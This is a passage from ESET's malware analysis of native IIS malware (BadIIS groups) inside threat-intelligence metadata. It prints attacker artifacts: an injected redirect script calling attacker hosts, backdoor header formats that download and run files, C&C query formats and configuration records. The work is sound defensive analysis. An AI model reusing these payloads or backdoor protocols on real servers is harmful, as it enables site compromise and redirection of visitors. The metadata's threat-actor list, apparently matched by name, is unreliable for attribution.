responses that the compromised IIS server serves\n\n[to search engine crawlers. Using a technique called keyword stuffing, the malware attempts to make a](https://developers.google.com/search/docs/advanced/guidelines/irrelevant-keywords)\n\nparticular WeChat group appear more popular, and rank higher when searching for a group of this type.\n\nWe obtained this sample from VirusTotal where it was uploaded in July 2020, but we don’t have any\n\ninformation about its targets from our telemetry, nor was it possible to perform an internet-wide scan\n\nto identify potential victims.\n\n#### ESET detection names\n\nWin32/BadIIS.A\n\n#### Implemented handlers\n```\nCHttpModule::OnMapPath\nCHttpModule::OnPreExecuteRequestHandler\nCHttpModule::OnSendResponse\n\n Features\n\n```\n**Feature** **Comment**\n\nModifies responses to HTTP requests from selected search engine web crawlers to serve:\n\n\nSEO fraud\n\n\n\n- An HTML response with meta keywords and meta description tags stuffed with keywords referring\nto a particular WeChat racing group\n\n- A malicious JavaScript file with unknown content, potentially redirect code that would force\nthe search engine to follow the redirect and index the content of the attacker’s choice\n\n\n#### SEO fraud mode\n\nThis malicious module only handles requests from selected Chinese search engine crawlers, ignoring all\n\nother requests (such as legitimate visitors of the compromised website). Following are the parameters\n\nof handled requests:\n\n- `Content-Type header is set to text/html`\n\n- The relative URL of the request contains one of the following substrings:\n\n  - index, default, Default\n\n- `User-Agent header contains one of the following substrings:`\n\n   - `360Spider, baidu.com, Baiduspider, sm.cn, Sogou web spider, sogou.com, soso.com,`\n```\n   Sosospider, uc.cn, YisouSpider\n\n```\nFor these requests, the malicious module modifies the HTTP response set by the IIS server. It first\n\niterates through the existing entity chunks of the response and matches them against regular\n\nexpressions to identify specific HTML elements:\n\n```\n<title>(.*?)title(.*?)>\n<meta(.*?)name(.*?)=(.*?)keywords(.*?)>\n<meta(.*?)name(.*?)=(.*?)description(.*?)>\n\n```\n\n-----\n\nFinally, it replaces these elements with a hardcoded version:\n\n```\n<title> &#24494;&#20449;&#32676;&#45;&#36187;&#36710;&#80;&#75;&#49;&#4\n8;&#32676;&#12304;&#36827;&#32676;&#24494;&#20449;&#102;&#117;&#110;&#5\n3;&#55;&#54;&#52;&#52;&#12305;&#95;&#24184;&#36816;&#39134;&#33351;&#95\n;&#24184;&#36816;&#50;&#56;&#32676;</title>\n<meta name = “keywords” content = “&#21271;&#20140;&#36187;&#36710;&#24\n494;&#20449;&#32676;&#44;&#21271;&#20140;&#24494;&#20449;&#36187;&#3671\n0;&#32676;&#44;&#21271;&#20140;&#36187;&#36710;&#24494;&#20449;&#32676;\n&#44;&#80;&#75;&#49;&#48;&#32676;&#44;&#21271;&#20140;&#36187;&#36710;&\n#112;&#107;&#49;&#48;&#24494;&#20449;&#32676;&#44;&#80;&#75;&#49;&#48;&\n#24494;&#20449;&#32676;&#44;&#36187;&#36710;&#24494;&#20449;&#32676;&#4\n4;&#21271;&#20140;&#36187;&#36710;&#32676;&#44;” />\n<meta name = “description” content = “&#21271;&#20140;&#36187;&#36710;&\n#24494;&#20449;&#32676;&#44;&#21271;&#20140;&#24494;&#20449;&#36187;&#3\n6710;&#32676;&#12304;&#36827;&#32676;&#24494;&#20449;&#21495;&#102;&#11\n7;&#11;&#53;&#55;&#54;&#52;&#52;&#12305;&#21271;&#20140;&#24494;&#20449\n;&#36187;&#36710;&#32676;&#44;&#21271;&#20140;&#24494;&#20449;&#36187;&\n#36710;&#32676;&#44;&#20960;&#30334;&#20154;&#2449;&#35465;&#22823;&#32\n676;&#44;&#36180;&#29575;&#39640;&#44;&#19979;&#20998;&#24555;&#44;&#3\n1119;&#21033;&#22810;&#44;&#27599;&#22825;&#37117;&#26377;&#24320;&#264\n26;&#31119;&#21033;&#9619;&#9619;&#9619;&#9619;&#9619;&#9619;&#9619;&#9\n619;&#9619;&#9619;&#9619;&#9619;&#9619;&#9619;&#9619;&#9619;&#27426;&#3\n6814;&#22823;&#23478;&#21152;&#20837;&#21271;&#20140;&#24494;&#20449;&#\n36187;&#36710;&#32676;&#30456;&#20114;&#20132;&#27969;&#12290;” />\n<script src=”https://js.breakavs[.]com/93/jc.js”></script>\n\n```\n\nThe keywords correspond to Chinese Unicode strings, for example 北京赛车微信群,北京微信赛车群,北\n\n京赛车微信群,PK10群,北京8d5b车pk10微信群 that loosely translate to “Beijing Racing WeChat Group,\n\nBeijing WeChat Racing Group, Beijing Racing WeChat Group, PK10 Group, Beijing 8d5b Car Pk10 WeChat\n\nGroup”.\n\nWe were not able to obtain the malicious JavaScript, so we don’t know its purpose, but it could be used\n\nto serve additional content to the search engine crawler, configurable on the fly, or could redirect the\n\ncrawler to a website of the attacker’s choice.\n\n#### IoCs\n\nSHA-1\n```\n2ED260A0EA017D0322C494E9EBFB0E1C07A6A0F2\n\n```\nFilenames and paths\n```\nFilterSecurity.dll\n\n```\nNetwork indicators (C&C server)\n```\nhttps://js.breakavs[.]com/93/jc.js\n\n```\n\n-----\n\n### Group 11\n\nGroup 11 is complex IIS malware, supporting a range of functionality such as manipulating HTTP\n\nresponses served to search engine crawlers and to legitimate users, serving as a proxy for another\n\nmalware’s C&C communication, and supporting backdoor commands to allow the attacker to control\n\nthe compromised server.\n\nThe first known instance of this malware is from September 2020; we have no information about its\n\ntargets.\n\n#### ESET detection names\n\nWin32/BadIIS.H, Win64/BadIIS.E\n\n#### Implemented handlers\n```\nCHttpModule::OnBeginRequest\n\n Features\n\n```\n**Feature** **Comment**\n\nSupported backdoor commands:\nBackdoor\n\n            - Uploads a file to the compromised server\n\nRelays HTTP requests from other compromised hosts to a C&C server, and\nProxy\nredirects the hosts to a URL from the configuration\n\nReplaces responses to HTTP requests from search engine crawlers with attackerSEO fraud\ncontrolled content\n\nReplaces responses to HTTP requests from selected visitors with attackerInjector\ncontrolled content\n\n#### Obtaining configuration\n\nOn each execution, the malware starts with obtaining its configuration from the C&C server, via a DNS\n\nTXT request for its C&C domain xinxx.allsoulu[.]com (using the DnsQuery_A API function). This\n\nconfiguration includes two URLs and indicators for which of the incoming HTTP requests should be\n\nprocessed by the malware.\n\nThe expected format of the configuration is the following:\n\n**<path1>|<path2>|<userAgent1>|<userAgent2>|<referer>|<flag>|<url1>|<url2>**\n\nParts <path1>, <path2>, <userAgent1>, <userAgent2> and <referer> can contain multiple entries,\n\ndelimited by “!”. These fields are used by the malware to handle incoming HTTP requests, as described in\n\nlater sections.\n\nDuring our investigation in November 2020, we obtained the configuration TXT record:&\n\n```\narticled!newz!productd!app!newq!zqb!docs!map.php|imagez|sogou!\nBaiduspider!Sosospider!360Spider!YisouSpider|iPhone|baidu.c!sogou!\nso.c!google!sm.c|88|http://143.92.48[.]38/?xhost=|http://allsoulu[.]\ncom/?tz=|\n\n```\n\n-----\n\nAs of the time of writing, the TXT record has changed as shown below; this may suggest that the\n\nattackers registered a different domain for this purpose. Note that the backdoor functionality of the\n\nmalware can still be used, even with the configuration information changed, and so the attackers can\n\nstill access previously compromised servers.\n\n```\nqqq1aqqq|qqqa1qqq|qqqa1qqq|iPhone|qqqqq1aaaqqaqa|88|http://baidu.com|\nhttp://baidu.com|\n\n```\n\nTo determine what action will be taken while processing the HTTP request, the module compares values\n\nfrom the configuration against server variables (i.e. HTTP headers and other parts of the request);\n\ncomparison is performed after converting all alphabetics to lowercase.\n\n#### C&C communication\n\nGroup 11 IIS malware implements an alternative channel for C&C communication. This is different from\n\nIIS malware families that only support backdoor functionality – the attackers can already control those\n\nbackdoors by sending an HTTP request to the compromised IIS server, so there is no need for alternative\n\nC&C channels.\n\nFor its injector, proxy and SEO fraud modes, this malware uses WinINet Windows API functions to\n\ncontact the C&C servers specified in its configuration. The HTTP or HTTPS protocol can be used, with\n\n[option flags set to 0x84008000 or 0x80FF9200 (binary bit flags of INTERNET_FLAG_* see WinINet](https://docs.microsoft.com/en-us/windows/win32/wininet/api-flags)\n\n_[reference), respectively.](https://docs.microsoft.com/en-us/windows/win32/wininet/api-flags)_\n\nAs shown in Figure 31, the malware relays HTTP requests from legitimate visitors, other compromised\n\nhosts or search engine crawlers, respectively, to the C&C server, which responds with data that will be\n\nused to modify the HTTP response for these requests.\n\nFigure 31 // Group 11 malware uses information from its C&C server to modify HTTP responses for inbound requests\n\nIn all cases, some information from the original HTTP request is embedded in the relayed request,\n\nsuch as the original User-Agent header, and the client’s IP address, that the malware includes in the\n```\nX-Forward-For header of the C&C request.\n\n#### Backdoor and proxy mode\n\n```\nThis module can be used by the attacker as a backdoor, or as a proxy that turns the compromised IIS\n\nserver into a part of C&C infrastructure (for other malware).\n\n\n-----\n\nThese modes are activated by special HTTP requests, that have a special Cmd header present, and\n\nwhose URL contains a substring from the configuration (path1 entry, for example articled, newz or\n```\nproductd).\n\n```\nBackdoor mode is activated if the Cmd header is in this format (the password is hardcoded in the sample,\n\nencrypted with a simple Caesar cipher):\n\n**<password>&<filename>&<url>&**\n\nWhen the module receives this command, it downloads a file from the specified URL and drops it on the\n\nIIS server under the specified name. This allows the attacker to modify the contents of the server.\n\nIn other cases, the HTTP request is simply forwarded to the C&C server using the C&C protocol\n\ndescribed in the previous section. The following format is used for the C&C query:\n```\n   http://www.allsoulu[.]com/1.php?cmdout=<urlEncodedCmdHeader>\n\n```\nThese HTTP requests are probably used to relay command outputs between a compromised client and\n\nC&C server. As a response to such requests, the malware adds the Location HTTP header to the HTTP\n\nresponse, which redirects the client to <url2><hostHeader>, with the URL from the configuration.\n\n#### SEO fraud and injector mode\n\nWhen the module detects a request from a search engine crawler or a legitimate visitor, it relays\n\ninformation about the request to the C&C server and replaces the HTTP response set by the IIS server to\n\nthe one obtained from the C&C server.\n\nThe following formats can be used for the C&C query:\n```\n   <url1>?xhost=<hostHeader>?&reurl=<originalPath>?<queryString>\n   <url1><hostHeader>&jump=1\n\n```\nFor example, a legitimate HTTP request to example.com/test.php?query could be\n\nrelayed to the C&C server as http://143.92.48[.]38/?xhost=example.com&jump=1 or\n```\nhttp://143.92.48[.]38/?xhost=example.com&reurl=test.php?query.\n\n```\nSearch engine crawler requests are recognized by the User-Agent header – according to the\n\nconfiguration (userAgent1 field), targeted are those with 360Spider, Baiduspider, sogou,\n```\nSosospider, YisouSpider substrings. These crawlers are presumably served content to manipulate\n\n```\nsearch engine algorithms.\n\nOn the other hand, the content served to legitimate visitors is probably ads, malicious redirects or other\n\nmalicious/unwanted content. This content is served in cases when the original request URL, User-Agent\n\nor Referer header contains a substring from the configuration (path1, path2, userAgent2 fields).\n\n#### IoCs\n\nSHA-1\n```\n33F999E9F31648B3115D314EC49B09A005EC992A\nA2EF7DE7A217B6F9F0F886B5D4DE4C56D5A6A7BE\n\n```\nFilenames and paths\n```\nHttpCache.dll\nhttpuser.dll\nispric.dll\n\n```\n\n-----\n\nNetwork indicators (HTTP headers)\n```\nCmd\n\n```\nNetwork indicators (C&C servers)\n```\n143.92.48[.]38\nwww.allsoulu[.]com\nxinxx.allsoulu[.]com\n\n### Group 12\n\n```\nGroup 12 is complex IIS malware supporting backdoor, proxy SEO fraud and injector modes. Some of its\n\n[samples are implemented as a trojanized version of F5XFFHttpModule.dll, which is a legitimate IIS](https://devcentral.f5.com/s/articles/x-forwarded-for-http-module-for-iis7-source-included)\n\n_[module used to convert the X-Forwarded-For HTTP header so it’s visible as the client IP address in the](https://devcentral.f5.com/s/articles/x-forwarded-for-http-module-for-iis7-source-included)_\n\nIIS logs.\n\nThere are differences between Group 12 variants – for example, the B variant is partially packed with\n\nUPX. In this section, we cover the most evolved variant (A), but note that some functionalities are not\n\nsupported by the other variants.\n\nThe first known instance of this malware is from March 2020; we have no information about its targets.\n\n#### ESET detection names\n\nWin32/BadIIS.H, Win32/BadIIS.I, Win64/BadIIS.AA, Win64/BadIIS.H, Win64/BadIIS.J\n\n#### Implemented handlers\n```\nCHttpModule::OnBeginRequest (malicious code)\nCHttpModule::OnAcquireRequestState, CHttpModule::OnSendResponse (benign code)\n\n Features\n\n```\n**Feature** **Comment**\n\n\nBackdoor\n\n\nSupported backdoor commands:\n\n - Collect system information\n\n - Upload a file to the compromised server\n\n - Execute a file\n\n - Execute a shell command\n\n\nRelays HTTP requests from other compromised hosts to a C&C server, and\nProxy\nredirects the hosts to a URL from the configuration\n\nReplaces responses to HTTP requests from search engine crawlers with\nSEO fraud\nattacker-controlled content\n\nReplaces responses to HTTP requests from selected visitors with attackerInjector\ncontrolled content\n\n#### Backdoor and proxy mode\n\nThe backdoor mode can be activated by an HTTP request with the following characteristics:\n\n- `cmd header must be present`\n\n- `3389 header must be in the format <password>$<command>$<arguments>`\n\nThe attacker’s password is recorded in the binaries as an MD5 hash, rather than in the clear, and varies\n\ndepending on the sample DLLs. Supported backdoor commands are listed in Table 11.\n\n\n-----\n\nTable 11 // Group 12 backdoor commands\n\n**Command name** **Command arguments** **Command description** **Return value**\n\n\n`in` N/A Collects system information.\n\n\nOS version,\narchitecture, locale info,\nPC name, username\nand physical path of the\nserver.\n\nContent of the\ntemporary file with\ncommand output (the\nfile is then deleted).\n\n\n`cmd` Command line\n\n\nExecutes the specified command by creating\na new process of %sysdir%\\CmD /C. Stores\nthe command output in a temporary file\nnamed with a gtest_redir prefix.\n\n\nDownloads data from the specified host and `download ok !! or`\n`dw` IP address, filename\nstores it in the specified filename.w `download error !!`\n\n\n`msf` IP address\n\n\nDownloads data from the specified host and\nexecutes it. When finished, it terminates the\ncurrent process (IIS Worker Process w3wp.\n```\nexe) via the ExitProcess API.\n\n```\n\nFor some samples, this malware also supports proxy functionality – for requests with the cmd header\n\npresent (but not 3389), the malware relays information about the request to the C&C server and\n\nreplaces the HTTP response body with the obtained data. The proxy functionality (but not the others) is\n\nimplemented in the same way as in Group 11 malware, which likely has the same malware developer.\n\n#### SEO fraud and injector mode\n\nFor HTTP requests received from search engine crawlers (based on the User-Agent header), or from\n\nlegitimate users, the malware replaces the HTTP response body with data downloaded from the C&C\n\nserver.\n\nFor C&C communication, it uses WinINet API functions and a hardcoded User-Agent string:\n```\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;). The downloaded data is always\n\n```\nstored in a temporary file, whose name is generated via the GetTempFileNameA function with the\n```\ngtest_redir prefix. The following folder is used to store the temporary files:\n   C:\\inetpub\\temp\\IIS Temporary Compressed Files\\\n\n#### IoCs\n\n```\nSHA-1\n\nVariant A\n```\n1E82C6DB2EE1688BF8B182FF93C9BEA8CD84BEC1\n7554B6A5244D4BCE83C2ABE762174399CDE1ED05\nDCACD46E441C42AA0EACBC99F072F3BA6A91D02B\n\n```\nVariant B\n```\n09BFC4596BAEF62BD2FFA79D5A4D4116B0186DB5\n6C531446598E743D315A74B4C1B3C08BE2B70C0C\nAFB59D38754ED71B251F89A999ECFB2046D5CB21\nFA790BCC0338899ABBF6C573D7FB76086A8CD62D\n\n```\nVariant C\n```\n5A3CC5E97AD448BF3DDDD4ABFD59BC74CD23B583\n\n```\n\n-----\n\nFilenames and paths\n```\nauthcutd.dll\nManagedEngineV4.1_32bit.dll\nManagedEngineV4.1_64bit.dll\nmscore.dll\n\n```\nNetwork indicators\n\nHTTP headers combinations\n```\n3389, Cmd\n\n```\nC&C servers\n```\nhttp://202.100.206[.]136:443\nhttp://center.g666[.]org:443/\nhttp://ee.allsoulu[.]com\nhttp://m.goudie[.]in:1024\nhttp://m.goudie[.]in:1024/?zz\nhttp://m.goudie[.]in:1024/js.html\nhttp://m.pz8[.]in/\nhttp://tz.allsoulu[.]com\nhttp://www.allsoulu[.]com\nhttp://www.g666[.]org/pic/\nhttp://www.pz9[.]in\nhttp://zz.allsoulu[.]com\n\n### Group 13\n\n```\nGroup 13 is the most versatile SEO fraud malware that we have analyzed. It supports several methods\n\nto deceive search engine crawlers, and allows the attackers to update its complex configuration via a\n\nbackdoor command. We first detected this malware in May 2021 on a couple of IIS servers in China.\n\n#### ESET detection names\n\nWin32/BadIIS.H\n\n#### Implemented handlers\n```\nCHttpModule::OnBeginRequest\nCHttpModule::OnSendResponse\n\n Features\n\n```\n**Feature** **Comment**\n\n\nBackdoor\n\nSEO fraud\n\n\nSupported backdoor commands:\n\n - Update module configuration\n\n - Read module configuration\n\nReplaces responses to HTTP requests from web crawlers with:\n\n - An HTTP redirect\n\n - A list of pre-configured backlinks\n\n - Attacker-controlled content obtained on the fly\n\n\n-----\n\n#### Backdoor mode\n\nGroup 13 is designed to serve manipulated content to search engine crawlers, using the configuration\n\ndata such as a redirect URL, or a list of backlinks. The only purpose of the backdoor mode of this\n\nmalware is to maintain this configuration data.\n\nThe attackers can list the current values of the configuration data by sending an HTTP request with\n\n**?DisplayModuleConfig=1 in the request URI. Group 13 will respond to this request with the current**\n\nvalues of all configuration fields, as listed in Table 12.\n\nAlternatively, the attackers can update any configuration field by sending an HTTP request with\n\n**?ReloadModuleConfig=1 in the request URI. Upon receiving this request, the malware obtains the**\n\nconfiguration from the C&C server by sending an HTTP GET request to this URL:\n\n**http://sb.qrfy[.]net/mconfig/<host>.xml**\n\nThe value <host> is taken from the original attacker request, and it is probably used as a victim ID. The\n\nlibcurl library is used for the network communication.\n\nTable 12 // Configuration fields used by Group 13\n\n**Configuration field** **Comment**\n\n`banip` List of IP addresses. The malware ignores HTTP requests from these IP addresses.\n\nBinary flag – set if the malware should handle requests with the strings spider,\n```\n     redirectreferer\n                  bot or baidu.com/ in the Referer header.\n\n```\nBinary flag – set if the malware should only handle crawler requests with the strings\n```\n     onlymobilespider\n                  Android or AppleWebKit in the Referer header.\n     redirect\n\n```\nIf these values are set, the malware will redirect all crawler requests to the\nconfigured URL via an HTTP 301 response.\n```\n     redirecturl\n     proxy\n\n```\nIf these values are set, the malware will forward the search engine crawler requests\n\n`proxyurl` to its C&C server, and replace the HTTP response with the obtained data, instead of\n\nredirecting the crawlers to a malicious URL directly.\n```\n     proxymode\n     folderlink\n     folderlinkcount\n     folderlinkpath\n\n```\n```\n     proxyfolder\n     locallink\n     locallinkext\n     locallinkfolder\n     locallinkcount\n\n#### SEO fraud mode\n\n```\n\nIf these values are set, the malware will add all of them as backlinks to the response\nfor any HTTP request with the strings spider or bot in the User-Agent header.\n\n\nThis malicious IIS module listens for incoming search engine crawler requests and manipulates them\n\naccording to its configuration. All other inbound HTTP requests are ignored.\n\nIf redirecturl is configured, the malware will redirect all requests with the strings spider or bot in\n\nthe User-Agent header to this URL by setting the Location header in the HTTP response. The HTTP\n\nstatus is set to 301 (“Moved Permanently”).\n\n\n-----\n\nIf proxymode is set, instead of redirecting the crawlers to a malicious URL, the malware will forward\n\nthe crawler request to its C&C server proxyurl, and will replace the HTTP response body with the\n\nacquired data. This is applied to all the HTTP requests with spider, bot or baidu.com/ in the Referer\n\nheader, or optionally to requests with the strings Android or AppleWebKit in the Referer header.\n\nAdditionally, the malware can be configured to:\n\n- Only handle those HTTP requests where the IIS server has set the response status to 404\n\n- Ignore requests coming from a configurable list of banned IP addresses\n\nFinally, the malware can have a list of links configured and add these links to the HTTP response body\n\nfor any search engine crawler requests. These links are added as HTML entities to the existing HTTP\n\nresponse body:\n```\n   <a href=’/<link><timestamp1>_<timestamp2>_<randomId>.html’></a>\n\n#### IoCs\n\n```\nSHA-1\n```\nD0F274EBD2A0636FEF9D9C48A7AC2FAD7B661653\n\n```\nFilenames and paths\n```\nstati.dll\n\n```\nNetwork indicators\n\nQuery parameters\n\n?DisplayModuleConfig=1\n\n?ReloadModuleConfig=1\n\nC&C servers\n```\nhttp://sb.qrfy[.]net\n\n### Group 14\n\n```\nGroup 14 is simple IIS malware that serves malicious content to search engine crawlers and legitimate\n\nvisitors. What sets this malware apart is that it only targets legitimate visitors accessing the website\n\n_from mobile devices._\n\nThe malware was first detected in February 2021, on a small number of targets in China.\n\n#### ESET detection names\n\nWin32/BadIIS.H, Win64/BadIIS.AA\n\n#### Implemented handlers\n```\nCHttpModule::OnSendResponse\n\n```\n\n-----\n\n#### Features\n\n**Feature** **Comment**\n\nReplaces responses to HTTP requests from web crawlers with\nSEO fraud\nattacker-controlled content.\n\nReplaces responses to HTTP requests from selected visitors\nInjector\nwith malicious content.\n\n#### SEO fraud mode\n\nWhen the module detects a request from a search engine crawler, it relays information about the\n\nrequest to the C&C server and replaces the HTTP response set by the IIS server to the one obtained from\n\nthe C&C server.\n\nSearch engine crawler requests are recognized when the following two conditions match:\n\n- The request URL contains one of these substrings: .asp, .shtml, .html, .htm\n\n- The User-Agent header contains one of these substrings: Baiduspider, 360Spider, Sogou,\n```\n YisouSpider\n\n```\nFor these requests, the malware obtains data from its C&C server via an HTTP GET request to the C&C\n\nserver now.asmkpo[.]com:80, with this HTTP body:\n\n```\nagent-self: <originalRequestURL>\n\n```\n**agent-file: <originalRequestURL>**\n```\nagent-ip: <clientIPaddress>\n\n```\n\nOne of these URIs is used:\n\n- `/self.php?v=<compromisedDomain>&p=<hostHeader>`\n\n- `/self.php?v=<compromisedDomain>&x=<hostHeader>`\n\n- `/utf.php?key=<compromisedDomain>&p=<hostHeader>`\n\n- `/utf.php?key=<compromisedDomain>&x=<hostHeader>`\n\nNote that these URLs always include another domain, hardcoded in the malicious samples (we have\n\nseen a different domain in each of the analyzed samples). We believe these are the domains of the\n\nwebsites hosted on the compromised IIS server, and are used to identify the victims.\n\nThe data obtained from the C&C server is then added to the HTTP response for this request.\n\nInterestingly, even in the cases the IIS server has previously set the server status to HTTP_STATUS_NOT_FOUND,\n\nthis malware will change it to HTTP_STATUS_OK to make sure the attacker-controlled content is\n\nprocessed by the search engine crawlers.\n\n#### Injector mode\n\nFor all HTTP requests with the Android or iPhone substrings in the User-Agent header, the malware\n\nreplaces the HTTP response with this content, which downloads a configurable list of URLs from\n```\nspeed.wlaspsd[.]com/vip.js and replaces the displayed website with a randomly chosen URL from\n\n```\nthe list:\n\n\n-----\n\n```\n<!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN” “http://\nwww.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd”><html xmlns=”http://\nwww.w3.org/1999/xhtml”><head><meta http-equiv=”Content-Type”\ncontent=”text/html; charset=utf-8” /><title>Loading...</title><script>\nvar _hmt = _hmt || [];\n(function() {\nvar hm = document.createElement(“script”);\nhm.src = \n“https://hm.baidu.com/hm.js?5db3660c69049859e81ba5f4d619f0b1”;\nvar s = document.getElementsByTagName(“script”)[0];\ns.parentNode.insertBefore(hm, s);\n})();\n</script><script>  function localU(q,c){   \nsetTimeout(function(){location.replace(q);},c);  \n}</script></head><body><script type=”text/javascript” \nsrc=”//speed.wlaspsd[.]com/vip.js”></script></body></html>\n\n```\n\nThe configurable part of the script downloaded from speed.wlaspsd[.]com/vip.js is:\n\n```\nvar jumpArr = \n[“https://haha.chunj1m[.]xyz/”,”https://hehe.qiu6j2[.]xyz/”];var\njumpArr = \n[“https://haha.chunj1m[.]xyz/”,”https://hehe.qiu6j2[.]xyz/”];\n\n```\n**var jumpRet = jumpArr[Math.floor(Math.random()*jumpArr.length)];**\n```\nlocalU(jumpRet,500);\n\n```\n\n#### IoCs\n\nSHA-1\n```\n086A211A069322DF84484E0E4B4B4D8AF3ADE95B\n30BE5F13FA182008EBE991C0795AFD3783AAA903\nCD1B29BFD41F469D9CB25FA282F26B3B2AB422B9\n\n```\nFilenames and paths\n```\nurlresol.dll\n\n```\nNetwork indicators (C&C servers)\n```\nnow.asmkpo[.]com:80\nspeed.wlaspsd[.]com/vip.js\n\n```\n_[Note the aggregated IoCs for all malware families are also published on our GitHub repository.](https://github.com/eset/malware-ioc/tree/master/badiis)_\n\n\n-----\n\n## ABOUT ESET\n\nFor more than 30 years, ESET® has been developing industry-leading IT security software and\n\nservices to protect businesses, critical infrastructure and consumers worldwide from increasingly\n\nsophisticated digital threats. From endpoint and mobile security to endpoint detection and response,\n\nas well as encryption and multifactor authentication, ESET’s high-performing, easy-to-use solutions\n\nunobtrusively protect and monitor 24/7, updating defenses in real time to keep users safe and\n\nbusinesses running without interruption. Evolving threats require an evolving IT security company\n\nthat enables the safe use of technology. This is backed by ESET’s R&D centers worldwide, working\n\n[in support of our shared future. For more information, visit www.eset.com or follow us on LinkedIn,](http://www.eset.com)\n\n_[Facebook and Twitter.](https://www.facebook.com/eset?ref=br_tf)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Anatomy-Of-Native-Iis-Malware-wp.pdf"
    ],
    "report_names": [
        "us-21-Anatomy-Of-Native-Iis-Malware-wp.pdf"
    ],
    "threat_actors": [
        {
            "id": "4b076dcb-516e-42fb-9c8f-f153902cd5e9",
            "created_at": "2022-10-25T16:07:23.708745Z",
            "updated_at": "2025-03-27T02:02:09.935617Z",
            "deleted_at": null,
            "main_name": "Hidden Lynx",
            "aliases": [
                "Aurora Panda",
                "Group 8",
                "Hidden Lynx",
                "Operation SMN"
            ],
            "source_name": "ETDA:Hidden Lynx",
            "tools": [
                "AGENT.ABQMR",
                "AGENT.AQUP.DROPPER",
                "AGENT.BMZA",
                "AGENT.GUNZ",
                "BlackCoffee",
                "HiKit",
                "MCRAT.A",
                "Mdmbot.E",
                "Moudoor",
                "Naid",
                "PNGRAT",
                "Trojan.Naid",
                "ZoxPNG",
                "gresim"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4d9cdc7f-72d6-4e17-89d8-f6323bfcaebb",
            "created_at": "2023-01-06T13:46:38.82716Z",
            "updated_at": "2025-03-27T02:00:02.928984Z",
            "deleted_at": null,
            "main_name": "GreyEnergy",
            "aliases": [],
            "source_name": "MISPGALAXY:GreyEnergy",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3fad11c6-4336-4b28-a606-f510eca5452e",
            "created_at": "2022-10-25T16:07:24.346573Z",
            "updated_at": "2025-03-27T02:02:10.183211Z",
            "deleted_at": null,
            "main_name": "Turbine Panda",
            "aliases": [
                "APT 26",
                "Black Vine",
                "Bronze Express",
                "Group 13",
                "JerseyMikes",
                "KungFu Kittens",
                "PinkPanther",
                "Shell Crew",
                "Turbine Panda",
                "WebMasters"
            ],
            "source_name": "ETDA:Turbine Panda",
            "tools": [
                "Agent.dhwf",
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "FF-RAT",
                "FormerFirstRAT",
                "Hurix",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mivast",
                "PlugX",
                "RbDoor",
                "RedDelta",
                "RibDoor",
                "Sakula",
                "Sakula RAT",
                "Sakurel",
                "Sogu",
                "StreamEx",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Winnti",
                "Xamtrav",
                "cobeacon",
                "ffrat"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "761d1fb2-60e3-46f0-9f1c-c8a9715967d4",
            "created_at": "2023-01-06T13:46:38.269054Z",
            "updated_at": "2025-03-27T02:00:02.789278Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "TG-0110",
                "Group 6",
                "Buckeye",
                "Boyusec",
                "BORON",
                "BRONZE MAYFAIR",
                "Red Sylvan",
                "GOTHIC PANDA"
            ],
            "source_name": "MISPGALAXY:APT3",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
